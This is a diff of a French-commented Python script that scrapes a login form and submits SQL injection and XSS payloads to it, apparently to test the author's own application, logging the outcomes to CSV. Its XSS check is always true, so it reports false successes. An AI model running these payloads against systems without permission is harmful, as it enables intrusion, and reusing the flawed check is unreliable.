@@ -16,19 +16,22 @@ def find_form(url):
     form = soup.find('form') # Extraire les élement entre les balises form
     return str(form)
 
-
-def find_user_pswd_button(url):
+def find_user_pswd_button(url, input_name = 'data-rel', type_login = 'text', type_password = 'password', type_button = 'button'):
     """Trouve le nom des entrées du formulaire et l'id du boutton"""
-    name_data = 'data-rel' #Nom du type de variable pour le login et password
+    name_data = input_name #Nom du type de variable pour le login et password
     form = find_form(url)
     soup = BeautifulSoup(form, 'html.parser')
     form = soup.find('form')
-    user = form.find('input', {'type': 'text'}) #Cherche les entrées de type text
+    user = form.find('input', {'type': type_login}) #Cherche les entrées de type text
     user_name = user[name_data]
-    pswd = form.find('input', {'type': 'password'}) #Cherche les entrées de type password
+    pswd = form.find('input', {'type': type_password}) #Cherche les entrées de type password
     pswd_name = pswd[name_data]
-    button = form.find('button', {'type' : 'button'}) #Cherche le boutton d'envoie du formulaire
-    button_id = button['id']
+    try:
+        button = form.find('button', {'type' : type_button}) #Cherche le boutton d'envoie du formulaire
+        button_id = button['id']
+    except:
+        button_id = ''
+        print("Error to find button")
     return str(user_name), str(pswd_name), str(button_id)
 
 
@@ -39,20 +42,22 @@ error_message = "No user were found with this credentials, using password" #Mess
 
 """Liste d'exploits"""
 exploit_name = ["Correct login/password", "False login/password", 
-                "SQL Injection Login (' OR '1'='1'; --)", "SQL Injection Login (or 1-- -' or 1 or '1'or 1 or')",
-                "SQL Injection Password (' OR '1'='1'; --)", "SQL Injection Password (or 1-- -' or 1 or '1'or 1 or')",
-                "XSS"] #Liste nom exploit
+                "SQL Injection Login 1", "SQL Injection Login 2",
+                "SQL Injection Password 1", "SQL Injection Password 2",
+                "XSS 1", "XSS 2"]
 login_list = ["admin", "admin" ,
                 "' OR '1'='1'; --", "or 1-- -' or 1 or '1'or 1 or'",
                 "false_login", "false_login",
-                "<Script>alert(“hack by falcon”)</Script>"] #Liste Login
+                "<script>alert(document.domain)</script>", "<img src/onerror=alert(document.cookie)>"]
 password_list = ["super_admin", "false_password",
                   "false_password", "false_paswd",
                   "' OR '1'='1'; --", "or 1-- -' or 1 or '1'or 1 or'",
-                  "<Script>alert(“hack by falcon”)</Script>"] #Liste Password
+                  "<script>alert(document.domain)</script>", "<img src/onerror=alert(document.cookie)>"]
 '''======================================'''
 
-
+#Récupère le formulaire
+form = find_form(url)
+#print(form)
 
 #Initialisation des payloads
 user_name, pswd_name, button_id = find_user_pswd_button(url)
@@ -65,10 +70,10 @@ for i in range (len(login_list)):
                 }
 
 #Ouverture du fichier d'écriture
-fileName="Exploits_rapport2.csv" #+str(dt.datetime.now().hour)+str(dt.datetime.now().minute)+str(dt.datetime.now().second)
+fileName="Exploits_rapport.csv" #+str(dt.datetime.now().hour)+str(dt.datetime.now().minute)+str(dt.datetime.now().second)
 file = open("./"+fileName, "w") 
-writer = csv.writer(file, delimiter=':')
-writer.writerow(["Exploit name","Access"])
+writer = csv.writer(file, delimiter=';')
+writer.writerow(["EXPLOIT NAME","RESULT", "LOGIN", "PASSWORD"])
 
 #Boucle test d'exploits
 for i in range (len(exploit_name)):
@@ -78,17 +83,25 @@ for i in range (len(exploit_name)):
     response_text = response.text
     # Test sur la réponse
     if response.status_code == 200:
-        print(f"Requete bien effectué pour : {exploit_name[i]}")
-        if error_message in response.text:
-            resultat = "Access Denied"
-            print(resultat+ "\n")
+        if "XSS" in exploit_name[i]: #Condition sur attaque xss
+            print(f"Requete bien effectué pour : {exploit_name[i]}")
+            if login_list[i] or password_list[i] in response_text:
+                resultat = "success XSS attack"
+                print(resultat+ "\n")
+            else:
+                resultat = "failed XSS attack"
+                print(resultat+ "\n")
         else:
-            resultat = "Access accepted"
-            print(resultat + "\n")
+            if error_message in response_text:
+                resultat = "Access Denied"
+                print(resultat+ "\n")
+            else:
+                resultat = "Access accepted"
+                print(resultat + "\n")
     else:
         resultat = f"Problème d'envoie requête à {url_back} pour tester {exploit_name[i]}"
         print(resultat +"\n")
-
-    writer.writerow([exploit_name[i],resultat]) #Ecriture fichier csv
-    #writer.writerows([[f"Login :{login_list[i]}",f"Password :{password_list[i]}"], [exploit_name[i],resultat]])
+    writer.writerow([exploit_name[i],resultat, login_list[i], password_list[i]]) #Ecriture fichier csv
 file.close()
+
+
